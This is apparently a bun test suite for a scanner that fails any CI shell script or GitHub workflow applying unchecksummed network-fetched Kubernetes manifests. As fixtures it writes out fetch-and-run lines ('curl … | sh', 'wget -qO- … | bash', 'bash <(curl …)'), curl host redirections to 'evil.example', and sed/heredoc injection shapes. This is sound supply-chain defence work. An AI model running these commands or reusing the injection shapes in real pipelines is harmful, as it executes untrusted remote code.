import { beforeAll, describe, expect, it } from 'bun:test';
import { execFileSync, spawnSync } from 'node:child_process';
import { chmodSync, mkdtempSync, readFileSync, rmSync, statSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join, normalize } from 'node:path';
import { parse } from 'yaml';
import {
  REMOTE_FETCH_ALLOWLIST,
  STATEMENT_ALLOWLIST,
  unsafeApplies,
  unsafeAppliesInWorkflow,
} from '../scripts/lib/apply-safety-scan.mjs';

/**
 * #1289: checksum-pin the cert-manager/Knative/Kourier/Calico cluster
 * manifests AND digest-pin the mutable-tag IMAGES those manifests reference.
 * Several kind lanes used to `kubectl apply -f <url>` those manifests with no
 * checksum at all: a moved/edited release asset would have applied silently.
 *
 * #1410 review rounds 1-4 found, each time, a spelling the previous regex set
 * missed (folded `run: >` one-liners, `-fsSLo`, `--output=`, `> f`, wget,
 * curl-wrapping helpers, `URL=…; apply -f "$URL"`, a new `.sh` outside the
 * scanned set, `-f-`, `create -f -`, `-f <(curl …)`, `|| exit 0`, `set +e`,
 * `if ! fetch …`, a checksum of a DIFFERENT file…). So the rule is no longer
 * enumerated here. It lives in `scripts/lib/apply-safety-scan.mjs`, a shell
 * lexer + dataflow walk that FAILS CLOSED: every `apply|create|replace -f/-k`
 * (by verb, whatever invokes it) must be provably a checksum-verified local
 * file whose `sha256sum -c` line names THAT file and dominates the apply, or
 * content with no network provenance. Anything it cannot classify is an
 * offender.
 *
 * This spec (1) runs that scanner over EVERY tracked shell script and EVERY
 * workflow/composite-action job — discovered, never listed — and requires the
 * real tree to be clean; (2) proves each reviewer bypass class is caught; and
 * (3) proves the legitimate shapes the real scripts use are not flagged.
 * `scripts/mutation-prove-kind-manifest-apply-safety.mjs` breaks each rule and
 * requires this spec to go red.
 */

const ROOT = join(import.meta.dirname, '..');

const CERT_MANAGER_SCRIPT = 'scripts/kind-manifests/apply-cert-manager.sh';
const KNATIVE_SCRIPT = 'scripts/kind-manifests/apply-knative-kourier.sh';
const PIN_SCRIPT = 'scripts/kind-manifests/pin-known-images.sh';
const DIGEST_TABLE = 'scripts/kind-manifests/image-digest-pins.json';
const NETPOL_DRILL_SCRIPT = 'packages/kn-next-operator/test/networkpolicy-enforcement-drill.sh';
const SZPG_PROFILE_B_SCRIPT = 'packages/kn-next-operator/test/e2e/szpg/setup-profile-b.sh';

function gitLsFiles(...pathspecs: string[]): string[] {
  return execFileSync('git', ['ls-files', '--', ...pathspecs], { cwd: ROOT, encoding: 'utf8' })
    .split('\n')
    .filter(Boolean);
}

function grepRepo(pattern: string): string[] {
  try {
    const out = execFileSync('git', ['grep', '-lE', pattern, '--', ':(exclude).claude/worktrees'], {
      cwd: ROOT,
      encoding: 'utf8',
    });
    return out.split('\n').filter(Boolean);
  } catch (e) {
    const err = e as { status?: number };
    if (err.status === 1) return [];
    throw e;
  }
}

/** Every kind-based workflow, discovered by scanning, never a hand-kept list. */
function kindWorkflows(): string[] {
  return grepRepo('kind create cluster|helm/kind-action').filter((f) =>
    f.startsWith('.github/workflows/'),
  );
}

// Lazy, once per file: the tracked lists never change while the spec runs, and
// re-running `git ls-files` per scanned file (the resolver did, ~300 times)
// was most of the whole-tree scan's wall time.
let shellSources: string[] | undefined;
let workflowSources: string[] | undefined;
const SHELL_SOURCES = () => (shellSources ??= gitLsFiles('*.sh', '*.bash'));
const WORKFLOW_SOURCES = () =>
  (workflowSources ??= gitLsFiles(
    '.github/workflows/*.yml',
    '.github/workflows/*.yaml',
    '.github/actions/**/action.yml',
    '.github/actions/**/action.yaml',
  ));

/**
 * Resolves a `source`d path the way the tree spells it: the tail after the
 * last variable / substitution (`"$HERE/_lib.sh"`, `"${SCRIPT_DIR}/lib/x.sh"`,
 * `/compute-files/lib.sh` inside an image), tried next to the sourcing file,
 * at the repo root, then as a unique suffix of a tracked script.
 */
let trackedShell: Set<string> | undefined;
function sourceResolver(from: string): (p: string) => string | null {
  const shell = SHELL_SOURCES();
  trackedShell ??= new Set(shell);
  const tracked = trackedShell;
  return (p) => {
    const tail = p
      .replace(/^.*[)}]/, '')
      .replace(/^.*\$[A-Za-z_]\w*/, '')
      .replace(/^\/+/, '');
    if (!tail || tail.includes('$')) return null;
    for (const c of [normalize(join(dirname(from), tail)), normalize(tail)])
      if (tracked.has(c)) return readFileSync(join(ROOT, c), 'utf8');
    const m = shell.filter((f) => f === tail || f.endsWith(`/${tail}`));
    return m.length === 1 ? readFileSync(join(ROOT, m[0]), 'utf8') : null;
  };
}

type TreeScan = { scanned: string[]; offenders: string[]; allowHits: Map<string, number> };

/** Scans the tree ONCE per spec file; every whole-tree test reads the same result. */
let treeScan: TreeScan | undefined;
const scanRealTree = (): TreeScan => (treeScan ??= scanRealTreeUncached());

function scanRealTreeUncached(): TreeScan {
  const scanned: string[] = [];
  const offenders: string[] = [];
  const allowHits = new Map<string, number>();
  for (const f of SHELL_SOURCES()) {
    scanned.push(f);
    const opts = { resolveSource: sourceResolver(f), allowHits, file: f };
    for (const o of unsafeApplies(readFileSync(join(ROOT, f), 'utf8'), opts))
      offenders.push(`${f}: ${o}`);
  }
  for (const f of WORKFLOW_SOURCES()) {
    scanned.push(f);
    const doc = parse(readFileSync(join(ROOT, f), 'utf8'));
    const opts = { resolveSource: sourceResolver(f), allowHits };
    for (const o of unsafeAppliesInWorkflow(doc, opts)) offenders.push(`${f}#${o}`);
  }
  return { scanned, offenders, allowHits };
}

const STRICT = 'set -euo pipefail\n';
const URL = 'https://example.com/m.yaml';
const SHA = 'aaaa000000000000000000000000000000000000000000000000000000000000';

/** A fixture, optionally with the offender KIND it must be flagged for. */
type Fixture = string | { src: string; kind: RegExp };

/**
 * Asserts every fixture is flagged FOR ITS REASON; reports which one slipped
 * through. A fixture with a `kind` needs an offender matching it; one without
 * needs an offender that is not merely "unparseable" — a lexer choke proves
 * nothing about the rule the fixture is named for.
 */
function expectAllFlagged(fixtures: Record<string, Fixture>) {
  const missed = Object.entries(fixtures)
    .filter(([, fx]) => {
      const { src, kind } = typeof fx === 'string' ? { src: fx, kind: undefined } : fx;
      const offenders = unsafeApplies(src);
      if (kind) return !offenders.some((o) => kind.test(o));
      return offenders.filter((o) => !/^unparseable/.test(o)).length === 0;
    })
    .map(([name]) => name);
  expect(missed).toEqual([]);
}

function expectNoneFlagged(fixtures: Record<string, string>) {
  const flagged = Object.entries(fixtures)
    .map(([name, src]) => [name, unsafeApplies(src)] as const)
    .filter(([, off]) => off.length > 0);
  expect(flagged).toEqual([]);
}

function workflow(run: string, extra = '', jobExtra = ''): unknown {
  return parse(
    `on: push\n${extra}jobs:\n  j:\n    runs-on: ubuntu-latest\n${jobExtra}    steps:\n${run}`,
  );
}

/** Runs a script with kind/kubectl/docker/go/curl stubbed to fail loudly: nothing real is touched. */
function runStubbed(script: string, args: string[], env: Record<string, string>) {
  const stubs = mkdtempSync(join(tmpdir(), 'kind-manifest-stubs-'));
  try {
    for (const tool of ['kind', 'kubectl', 'docker', 'go', 'curl', 'wget', 'kn-next', 'bun']) {
      writeFileSync(join(stubs, tool), `#!/bin/sh\necho "STUB ${tool} $*" >&2\nexit 97\n`);
      chmodSync(join(stubs, tool), 0o755);
    }
    return spawnSync('bash', [join(ROOT, script), ...args], {
      cwd: ROOT,
      encoding: 'utf8',
      env: { PATH: `${stubs}:/usr/bin:/bin`, HOME: tmpdir(), ...env },
    });
  } finally {
    rmSync(stubs, { recursive: true, force: true });
  }
}

describe('kind-cluster cert-manager/Knative/Calico manifests are checksum + image-digest pinned (#1289)', () => {
  // The whole-tree scan (~2.7 s here, more on a loaded CI runner) runs ONCE, up
  // front, under an explicit timeout — never inside whichever test happens to
  // touch it first, where it ate ~90% of bun's 5000 ms per-test default and
  // flaked. Every test below reads the cached result.
  beforeAll(() => {
    scanRealTree();
  }, 60_000);

  it('the kind-workflow scan itself is alive (finds all four known lanes)', () => {
    const found = kindWorkflows();
    expect(found).toContain('.github/workflows/operator-e2e-nightly.yml');
    expect(found).toContain('.github/workflows/operator-bundle-e2e.yml');
    expect(found).toContain('.github/workflows/file-manager-platform-e2e-nightly.yml');
    expect(found).toContain('.github/workflows/networkpolicy-enforcement.yml');
  });

  it('every workflow that installs cert-manager calls the shared script', () => {
    for (const wf of kindWorkflows()) {
      const text = readFileSync(join(ROOT, wf), 'utf8');
      if (!/cert-manager/i.test(text)) continue;
      expect(text).toContain(CERT_MANAGER_SCRIPT);
    }
  });

  it('every workflow that installs Knative Serving/Kourier calls the shared script', () => {
    for (const wf of kindWorkflows()) {
      const text = readFileSync(join(ROOT, wf), 'utf8');
      if (!/knative|kourier/i.test(text)) continue;
      expect(text).toContain(KNATIVE_SCRIPT);
    }
  });

  it('the source scan covers EVERY tracked shell script and workflow — not a kubectl-grep subset', () => {
    const { scanned } = scanRealTree();
    // Exactly the tracked set: a new script anywhere in the tree is scanned
    // the moment it is committed.
    expect(scanned.length).toBe(SHELL_SOURCES().length + WORKFLOW_SOURCES().length);
    expect(scanned).toContain(CERT_MANAGER_SCRIPT);
    expect(scanned).toContain(KNATIVE_SCRIPT);
    expect(scanned).toContain(NETPOL_DRILL_SCRIPT);
    // Outside scripts/, invokes kubectl as `$K`, and was a live bare-URL gap
    // the round-3 scanner never saw.
    expect(scanned).toContain(SZPG_PROFILE_B_SCRIPT);
    expect(scanned).toContain('.github/workflows/operator-e2e-nightly.yml');
    expect(SHELL_SOURCES().length).toBeGreaterThan(100);
  });

  it('the real tree has NO unsafe apply anywhere (every script, every workflow job)', () => {
    expect(scanRealTree().offenders).toEqual([]);
  });

  // ---- bypass class 1: fetch spellings and one-line chains ---------------

  it('class 1: catches every fetch spelling, a one-line chain, and a curl-wrapping helper', () => {
    expectAllFlagged({
      oneLineChain: `${STRICT}curl -sSL -o f "${URL}" && kubectl apply -f f`,
      combinedShortFlags: `${STRICT}curl -fsSLo f "${URL}"\nkubectl apply -f f`,
      outputEquals: `${STRICT}curl -sSL --output=f "${URL}"\nkubectl apply -f f`,
      bareRedirect: `${STRICT}curl -sSL "${URL}" > f\nkubectl apply -f f`,
      teeTarget: `${STRICT}curl -sSL "${URL}" | tee f >/dev/null\nkubectl apply -f f`,
      wgetO: `${STRICT}wget -O f "${URL}"\nkubectl apply -f f`,
      wgetDefaultName: `${STRICT}wget -q "${URL}"\nkubectl apply -f m.yaml`,
      curlRemoteName: `${STRICT}curl -fsSLO "${URL}"\nkubectl apply -f m.yaml`,
      copiedAfterFetch: `${STRICT}curl -o f "${URL}"\ncp f g\nkubectl apply -f g`,
      helper: `${STRICT}dl() { curl -fsSL -o "$2" "$1"; }\ndl "${URL}" f\nkubectl apply -f f`,
      helperBracedPositional: `${STRICT}dl() { local out="\${2}"; curl -fsSL -o "\${out}" "$1"; }\ndl "${URL}" f\nkubectl apply -f f`,
      helperWrappedByRetry: `${STRICT}dl() { curl -fsSL -o "$2" "$1"; }\nretry 3 dl "${URL}" f\nkubectl apply -f f`,
      applierHelper: `${STRICT}ap() { kubectl apply -f "$1"; }\ncurl -o f "${URL}"\nap f`,
      varIndirectPath: `${STRICT}D=/tmp\ncurl -o "\${D}/f" "${URL}"\nOUT="$D/f"\nkubectl apply -f "$OUT"`,
      dirApply: `${STRICT}curl -o d/f.yaml "${URL}"\nkubectl apply -f d/`,
      twoFilesOneVerified: `${STRICT}curl -o f U1 && curl -o g U2 && echo "${SHA}  f" | sha256sum -c - && kubectl apply -f g`,
    });
  });

  it('class 1: a folded YAML `run: >` block and a fetch in an EARLIER step are caught', () => {
    const folded = workflow(
      `      - run: >\n          curl -sSL -o f "${URL}" &&\n          kubectl apply -f f\n`,
    );
    expect(unsafeAppliesInWorkflow(folded).length).toBeGreaterThan(0);
    const crossStep = workflow(
      `      - run: curl -sSL -o /tmp/m.yaml "${URL}"\n      - run: echo hi\n      - run: kubectl apply -f /tmp/m.yaml\n`,
    );
    expect(unsafeAppliesInWorkflow(crossStep).length).toBeGreaterThan(0);
  });

  // ---- bypass class 2: bare URLs, indirection, streams --------------------

  it('class 2: catches bare URLs through any invoker, indirection, and stream applies', () => {
    expectAllFlagged({
      direct: `kubectl apply -f ${URL}`,
      globalFlagsBeforeVerb: `kubectl --context kind-x apply -f ${URL}`,
      aliasVar: `K="kubectl --context=x"\n$K apply -f "${URL}"`,
      helperInvoker: `K() { kubectl --context x "$@"; }\nK apply -f "${URL}"`,
      filenameEquals: `kubectl apply --filename=${URL}`,
      fEquals: `kubectl apply -f=${URL}`,
      fAttached: `kubectl apply -f${URL}`,
      varIndirection: `URL=${URL}\nkubectl apply -f "$URL"`,
      stdinDash: `curl -fsSL "${URL}" | kubectl apply -f-`,
      createStdin: `curl -fsSL "${URL}" | kubectl create -f -`,
      replaceStdin: `curl -fsSL "${URL}" | kubectl replace -f -`,
      processSubstitution: `kubectl apply -f <(curl -fsSL "${URL}")`,
      capturedContent: `M="$(curl -fsSL "${URL}")"\necho "$M" | kubectl apply -f -`,
      hereString: `M="$(curl -fsSL "${URL}")"\nkubectl apply -f - <<< "$M"`,
      kustomizeRemote: `kubectl apply -k github.com/org/repo/config?ref=main`,
      kustomizeBuildUrl: `kustomize build ${URL} | kubectl apply -f -`,
      bashDashC: `bash -c "kubectl apply -f ${URL}"`,
      evalString: `eval "kubectl apply -f ${URL}"`,
    });
  });

  it('class 2: a workflow `env:` URL and a `$GITHUB_ENV` URL from an earlier step are caught', () => {
    const envUrl = workflow(`      - run: kubectl apply -f "$M"\n`, `env:\n  M: ${URL}\n`);
    expect(unsafeAppliesInWorkflow(envUrl).length).toBeGreaterThan(0);
    const ghEnv = workflow(
      `      - run: echo "M=${URL}" >> "$GITHUB_ENV"\n      - run: kubectl apply -f "$M"\n`,
    );
    expect(unsafeAppliesInWorkflow(ghEnv).length).toBeGreaterThan(0);
  });

  // ---- bypass class 3: defeated or non-dominating verification ------------

  it('class 3: a checksum that can be ignored, or does not dominate the apply, verifies nothing', () => {
    const fetch = `curl -fsSL -o f "${URL}"\n`;
    const check = `echo "${SHA}  f" | sha256sum -c -`;
    expectAllFlagged({
      orTrue: `${STRICT}${fetch}${check} || true\nkubectl apply -f f`,
      orExit0: `${STRICT}${fetch}${check} || exit 0\nkubectl apply -f f`,
      orBinTrue: `${STRICT}${fetch}${check} || /bin/true\nkubectl apply -f f`,
      setPlusE: `${STRICT}set +e\n${fetch}${check}\nset -e\nkubectl apply -f f`,
      noErrexitAtAll: `${fetch}${check}\nkubectl apply -f f`,
      ifNotFetch: `${STRICT}fetch() { curl -fsSL -o "$3" "$1"; echo "$2  $3" | sha256sum -c -; }\nif ! fetch "${URL}" "${SHA}" f; then echo warn; fi\nkubectl apply -f f`,
      commentOnly: `${STRICT}${fetch}# echo "${SHA}  f" | sha256sum -c -\nkubectl apply -f f`,
      otherFilesChecksum: `${STRICT}${fetch}echo "${SHA}  other.yaml" | sha256sum -c -\nkubectl apply -f f`,
      checksumsFileShape: `${STRICT}${fetch}sha256sum -c checksums.txt\nkubectl apply -f f`,
      insideIfBlock: `${STRICT}${fetch}if [ -n "$X" ]; then ${check}; fi\nkubectl apply -f f`,
      notLastInChain: `${STRICT}${fetch}${check} && echo ok\nkubectl apply -f f`,
      skippedByAnd: `${STRICT}${fetch}false && ${check}\nkubectl apply -f f`,
      afterOr: `${STRICT}${fetch}true || ${check}\nkubectl apply -f f`,
      pipedOnward: `${STRICT}${fetch}${check} | tee log\nkubectl apply -f f`,
      backgrounded: `${STRICT}${fetch}${check} &\nkubectl apply -f f`,
      refetchedAfterCheck: `${STRICT}${fetch}${check}\n${fetch}kubectl apply -f f`,
      verifyAfterApply: `${STRICT}${fetch}kubectl apply -f f\n${check}`,
    });
  });

  // ---- fail closed on what cannot be classified ---------------------------

  it('fails closed on constructs it cannot classify', () => {
    expectAllFlagged({
      unterminatedHeredoc: { src: `kubectl apply -f - <<EOF\nkind: Pod\n`, kind: /^unparseable/ },
      stdinWithNoProducer: `kubectl apply -f -`,
      emptyTarget: `kubectl apply -f`,
    });
    // A GitHub expression is substituted before bash runs: unknowable here.
    const expr = workflow(`      - run: kubectl apply -f ${'$'}{{ inputs.manifest }}\n`);
    expect(unsafeAppliesInWorkflow(expr).length).toBeGreaterThan(0);
  });

  // ---- the legitimate shapes the real scripts use -------------------------

  it('does NOT flag a dominating checksum, a trusted helper, local renders, or committed manifests', () => {
    expectNoneFlagged({
      verified: `${STRICT}curl -fsSL -o f "${URL}"\necho "${SHA}  f" | sha256sum -c -\nkubectl apply -f f`,
      verifiedSameChain: `${STRICT}curl -fsSL -o f "${URL}" && echo "${SHA}  f" | sha256sum -c - && kubectl apply -f f`,
      trustedHelper: `${STRICT}fetch() { curl -fsSL -o "$3" "$1"; echo "$2  $3" | sha256sum -c -; }\nfetch "${URL}" "${SHA}" f\nkubectl apply -f f`,
      localRenderStdin: `POLICY=$(go run ./cmd/policygen)\necho "$POLICY" | kubectl apply -f -`,
      committedManifest: 'kubectl apply -f apps/file-manager/platform-e2e/data-plane.yaml',
      literalHeredoc: `kubectl apply -f - <<'YAML'\nkind: ConfigMap\nmetadata: { name: x, annotations: { docs: "${URL}" } }\nYAML`,
      sedOfLocalFile: `sed -e "s#a#${URL}#" deploy/x.yaml | kubectl apply -f -`,
    });
  });

  it('the loopback exemption is strict: a variable host, a userinfo trick, or a nested URL is still network', () => {
    expectAllFlagged({
      // Piped straight into the apply, so ONLY the loopback test decides.
      varHost: 'curl -s "http://$HOST:9898/x" | kubectl apply -f -',
      userinfoTrick: 'curl -s "http://localhost:9898$P" | kubectl apply -f -',
      nestedUrl: `curl -s "http://localhost:8080/proxy?u=${URL}" | kubectl apply -f -`,
      // As a $(…) scalar, ONLY the loopback test decides whether it is data.
      nestedUrlScalar: `X=$(curl -s "http://localhost:8080/proxy?u=${URL}")\npython3 gen --v="$X" | kubectl apply -f -`,
    });
  });

  // ---- #1410 round 6: a loopback fetch is STILL a taint source -----------

  it('round 6: a loopback fetch taints its output — it reaches no apply and no -f path', () => {
    expectAllFlagged({
      loopbackPipedToApply: 'curl -s http://127.0.0.1:9000/x | kubectl apply -f -',
      loopbackWgetPipedToApply: 'wget -qO- http://127.0.0.1:9000/x | kubectl apply -f -',
      execCurlToFileThenApply:
        'kubectl exec pod -- curl http://localhost:8080/manifest.yaml > m.yaml\nkubectl apply -f m.yaml',
      // A port-forward makes "localhost" the upstream: a real remote fetch.
      portForwardThenApply:
        'kubectl port-forward svc/x 8080:80 &\ncurl -o r.yaml http://localhost:8080/release.yaml\nkubectl apply -f r.yaml',
      connectToRedirect:
        'curl --connect-to localhost:80:evil.example:80 http://localhost/x | kubectl apply -f -',
      resolveRedirect:
        'curl --resolve localhost:80:203.0.113.9 http://localhost/x | kubectl apply -f -',
      hostHeader: "curl -H 'Host: evil.example' http://localhost/x | kubectl apply -f -",
      // Content copied out of a remote-derived variable is not a scalar.
      remoteVarLaundered: 'X=$(curl -s "$SRC")\nY="$X"\npython3 gen "$Y" | kubectl apply -f -',
      remoteVarAsDataArg: 'X=$(curl -s "$SRC")\npython3 gen "$X" | kubectl apply -f -',
      loopbackGitFetch:
        'git fetch http://localhost:3000/r.git\ngit checkout FETCH_HEAD -- x.yaml\nkubectl apply -f x.yaml',
      loopbackVarPrintf:
        'X=$(curl -s http://localhost:8080/m)\nprintf %s "$X" | kubectl apply -f -',
      loopbackVarWholeHeredocLine:
        'X=$(curl -s http://localhost:8080/m)\nkubectl apply -f - <<YAML\n$X\nYAML',
      loopbackVarAsTarget: 'X=$(curl -s http://localhost:8080/m)\nkubectl apply -f "$X"',
      loopbackVarThenApply: 'X=$(curl -s http://localhost:8080/m)\necho "$X" | kubectl apply -f -',
    });
  });

  it('round 6: a loopback fetch may still feed grep, tr, a $(…) scalar or /dev/null', () => {
    expectNoneFlagged({
      toGrep: 'curl -s http://localhost:9898/v1/t | grep -q ok\nkubectl apply -f deploy/x.yaml',
      toTr: 'curl -s http://127.0.0.1:9898/v1/t | tr -d "\\n" >/dev/null\nkubectl apply -f deploy/x.yaml',
      toDevNull:
        'curl -s -o /dev/null http://localhost:9898/healthz\nkubectl apply -f deploy/x.yaml',
      toScalar:
        'CODE=$(curl -s -o /dev/null -w "%{http_code}" http://localhost:9898/x)\ntest "$CODE" = 200\nkubectl apply -f deploy/x.yaml',
    });
  });

  it('round 6: cloning a plain local path is not a remote fetch; a remote clone still is', () => {
    expectNoneFlagged({
      relativeClone: 'git clone ./local-repo work\nkubectl apply -f deploy/x.yaml',
      absoluteClone: 'git clone /abs/path/repo work\nkubectl apply -f deploy/x.yaml',
    });
    expectAllFlagged({
      httpsClone: 'git clone https://example.com/r.git work\nkubectl apply -f work/x.yaml',
      scpClone: 'git clone git@example.com:o/r.git work\nkubectl apply -f work/x.yaml',
    });
  });

  // ---- #1410 round 7: a fetched value is never data ----------------------
  //
  // A value read from a loopback endpoint can still hold a newline, `---` and
  // a whole second document. There is no "scalar" carve-out: every way a
  // fetched value can reach an applied manifest is an offender. (The four
  // real sites are named in STATEMENT_ALLOWLIST, below.)

  const LB = 'X=$(curl -s http://localhost:8080/x)\n';
  const LB2 = `${LB}Y=$(curl -s http://localhost:8080/y)\n`;
  const APPLY_STDIN = 'kubectl apply -f - <<YAML\n';

  it('round 7: a loopback curl piped straight into an apply is flagged', () => {
    expectAllFlagged({
      piped: {
        src: 'curl -s http://127.0.0.1:9000/x | kubectl apply -f -',
        kind: /fed by network content \(fetch command/,
      },
    });
  });

  it('round 7: git fetch of a loopback URL is a remote fetch', () => {
    expectAllFlagged({
      loopbackGitFetch: {
        src: 'git fetch http://localhost:3000/r.git\ngit checkout FETCH_HEAD -- x.yaml\nkubectl apply -f x.yaml',
        kind: /unclassified remote fetch \(git fetches a remote repository\)/,
      },
    });
  });

  it('round 7: a fetched value interpolated into an unquoted heredoc is an offender in every position', () => {
    const inHeredoc = (body: string, pre = LB) => `${pre}${APPLY_STDIN}${body}\nYAML`;
    const kind = /heredoc expands variable \$\w+ holds network content/;
    expectAllFlagged({
      // `foo\n---\nkind: ClusterRoleBinding…` in $X adds a second document.
      field: { src: inHeredoc('name: $X'), kind },
      quotedField: { src: inHeredoc('name: "$X"'), kind },
      bracedField: { src: inHeredoc('name: ${X}'), kind },
      blockScalar: { src: inHeredoc('data: |\n  $X'), kind },
      foldedScalar: { src: inHeredoc('data: >-\n  $X'), kind },
      listItem: { src: inHeredoc('items:\n  - $X'), kind },
      concatenated: { src: inHeredoc('name: $X$Y', LB2), kind },
      wholeLineQuoted: { src: inHeredoc('"$X"'), kind },
      wholeLineBare: { src: inHeredoc('$X'), kind },
      copiedVar: { src: inHeredoc('name: $Y', `${LB}Y="$X"\n`), kind },
      wholeManifestCopiedIntoField: {
        src: inHeredoc('data: "$F"', 'M=$(curl -s http://localhost:8080/m.yaml)\nF="$M"\n'),
        kind,
      },
    });
  });

  it('round 7: a fetched value handed to sed / awk / yq before an apply is an offender', () => {
    const kind = /fed by network content \(variable \$X holds network content\)/;
    const piped = (cmd: string) => `${LB}${cmd} | kubectl apply -f -`;
    expectAllFlagged({
      // BSD sed: a backslash-newline in $X adds a `---` document; GNU sed: `;e cmd` runs one.
      sedSubstitute: { src: piped('sed "s/P/$X/" t.yaml'), kind },
      sedBraced: { src: piped('sed -e "s/P/${X}/g" -e "s/^/  /" t.yaml'), kind },
      sedExec: { src: piped('sed "s/P/y/;$X" t.yaml'), kind },
      awkVar: { src: piped('awk -v v="$X" \'{print} END{print v}\' t.yaml'), kind },
      yqExpression: { src: piped('yq ".metadata.name = \\"$X\\"" t.yaml'), kind },
    });
  });

  it('round 7: a fetched value emitted or applied as the document is an offender', () => {
    expectAllFlagged({
      echoed: { src: `${LB}echo "$X" | kubectl apply -f -`, kind: /fed by network content/ },
      printfed: { src: `${LB}printf %s "$X" | kubectl apply -f -`, kind: /fed by network content/ },
      asTarget: {
        src: 'X=$(curl -s "$SRC")\nkubectl apply -f "$X"',
        kind: /apply of a variable holding network content/,
      },
    });
  });

  // ---- #1410 round 5, finding 1: the step's shell decides errexit ---------

  const verifiedStep = (mod: string) =>
    `      - ${mod}run: |\n          curl -fsSL -o f "${URL}"\n          echo "${SHA}  f" | sha256sum -c -\n          kubectl apply -f f\n`;
  const NO_E = 'bash --noprofile --norc {0}';

  it('round 5: errexit comes from the EFFECTIVE step shell (step, job defaults, workflow defaults)', () => {
    // Controls: GitHub's `bash`, and a custom template that passes -e, keep errexit.
    expect(unsafeAppliesInWorkflow(workflow(verifiedStep('')))).toEqual([]);
    expect(unsafeAppliesInWorkflow(workflow(verifiedStep('shell: bash -e {0}\n        ')))).toEqual(
      [],
    );
    // A template without -e: a failed checksum no longer stops the apply.
    const stepShell = workflow(verifiedStep('shell: bash {0}\n        '));
    const wfDefault = workflow(verifiedStep(''), `defaults:\n  run:\n    shell: ${NO_E}\n`);
    const jobDefault = workflow(
      verifiedStep(''),
      '',
      `    defaults:\n      run:\n        shell: ${NO_E}\n`,
    );
    expect(unsafeAppliesInWorkflow(stepShell).length).toBeGreaterThan(0);
    expect(unsafeAppliesInWorkflow(wfDefault).length).toBeGreaterThan(0);
    expect(unsafeAppliesInWorkflow(jobDefault).length).toBeGreaterThan(0);
  });

  it('round 5: a step whose shell is not a POSIX shell (pwsh, python) cannot be classified', () => {
    const run = `run: |\n          Invoke-WebRequest "${URL}" -OutFile f\n          kubectl apply -f f\n`;
    for (const shell of ['pwsh', 'python', 'cmd']) {
      const off = unsafeAppliesInWorkflow(workflow(`      - shell: ${shell}\n        ${run}`));
      expect({ shell, off: off.join('\n').includes('unclassifiable step shell') }).toEqual({
        shell,
        off: true,
      });
    }
  });

  it('round 5: a checksum step with continue-on-error or an if: does not cover a LATER step', () => {
    const steps = (mod: string) =>
      `      - ${mod}run: |\n          curl -fsSL -o f "${URL}"\n          echo "${SHA}  f" | sha256sum -c -\n      - run: kubectl apply -f f\n`;
    expect(unsafeAppliesInWorkflow(workflow(steps('')))).toEqual([]);
    const coe = workflow(steps('continue-on-error: true\n        '));
    const guarded = workflow(steps("if: github.event_name == 'push'\n        "));
    expect(unsafeAppliesInWorkflow(coe).length).toBeGreaterThan(0);
    expect(unsafeAppliesInWorkflow(guarded).length).toBeGreaterThan(0);
  });

  // ---- #1410 round 5, finding 2: unclassified remote fetches ---------------

  const remoteFetchFlagged = (src: string, opts = {}) =>
    unsafeApplies(src, opts).some((o) => o.startsWith('unclassified remote fetch'));

  it('round 5: a remote fetch the taint walk cannot follow fails as "unclassified remote fetch"', () => {
    const cases: Record<string, string> = {
      pythonUrllib: `python3 -c "import urllib.request as u; u.urlretrieve('${URL}', 'f')"\nkubectl apply -f f`,
      nodeFetch: `node -e "fetch('${URL}').then(r => r.text()).then(t => require('fs').writeFileSync('f', t))"\nkubectl apply -f f`,
      nodeHeredoc: `node - <<'JS'\nconst r = await fetch('${URL}');\nrequire('fs').writeFileSync('f', await r.text());\nJS\nkubectl apply -f f`,
      gitClone: 'git clone https://github.com/org/repo r\nkubectl apply -f r/config',
      ghReleaseDownload: 'gh release download v1 -R org/repo -p m.yaml\nkubectl apply -f m.yaml',
      helmRemoteChart: 'helm install x https://example.com/chart-1.0.0.tgz',
      helmRepoAdd: 'helm repo add r https://charts.example.com\nhelm install x r/chart',
      curlPipeSh: `curl -fsSL "${URL}" | sh`,
      wgetPipeBash: `wget -qO- "${URL}" | bash`,
      bashProcessSubstitution: `bash <(curl -fsSL "${URL}")`,
      shDashCCurl: `sh -c "$(curl -fsSL "${URL}")"`,
    };
    const missed = Object.entries(cases)
      .filter(([, src]) => !remoteFetchFlagged(src))
      .map(([name]) => name);
    expect(missed).toEqual([]);
  });

  it('round 5: a heredoc fed to ssh / docker exec / a shell is scanned as a script', () => {
    expectAllFlagged({
      sshHeredoc: `ssh ops@host <<'EOF'\nkubectl apply -f ${URL}\nEOF`,
      sshBashS: `ssh -i key ops@host bash -s <<'EOF'\nkubectl apply -f ${URL}\nEOF`,
      dockerExecSh: `docker exec -i ctr sh <<'EOF'\nkubectl apply -f ${URL}\nEOF`,
      hereStringToBash: `bash <<< "kubectl apply -f ${URL}"`,
    });
    // A heredoc fed to ssh AS DATA (the remote command reads stdin) is not a script.
    expectNoneFlagged({
      sshDataHeredoc: `ssh ops@host 'cat > /tmp/x' <<'EOF'\nit's data, with an unbalanced ' quote\nEOF`,
    });
  });

  it('round 5: a sourced helper is followed, and an unresolvable one fails closed on a URL call', () => {
    const lib = 'fetch_manifest() { curl -fsSL -o "$2" "$1"; }';
    const caller = `${STRICT}source ./lib.sh\nfetch_manifest "${URL}" f\nkubectl apply -f f`;
    // Followed: the helper's curl taints f, so the unchecked apply is caught.
    expect(unsafeApplies(caller, { resolveSource: () => lib }).length).toBeGreaterThan(0);
    // Followed, and the caller checksums before applying: clean.
    const verifiedCaller = `${STRICT}source ./lib.sh\nfetch_manifest "${URL}" f\necho "${SHA}  f" | sha256sum -c -\nkubectl apply -f f`;
    expect(unsafeApplies(verifiedCaller, { resolveSource: () => lib })).toEqual([]);
    // Unresolvable: the URL-taking call fails closed.
    expect(remoteFetchFlagged(caller, { resolveSource: () => null })).toBe(true);
    expect(remoteFetchFlagged(caller)).toBe(true);
  });

  it('round 5: every `source`d file in the tree resolves (so the real-tree scan follows it)', () => {
    const unresolved: string[] = [];
    let seen = 0;
    for (const f of SHELL_SOURCES()) {
      const resolve = sourceResolver(f);
      const text = readFileSync(join(ROOT, f), 'utf8');
      for (const m of text.matchAll(/^\s*(?:source|\.)\s+(\S+)\s*$/gm)) {
        seen += 1;
        const word = m[1].replace(/^["']|["']$/g, '');
        if (resolve(word) === null) unresolved.push(`${f}: ${word}`);
      }
    }
    expect(seen).toBeGreaterThan(0);
    expect(unresolved).toEqual([]);
  });

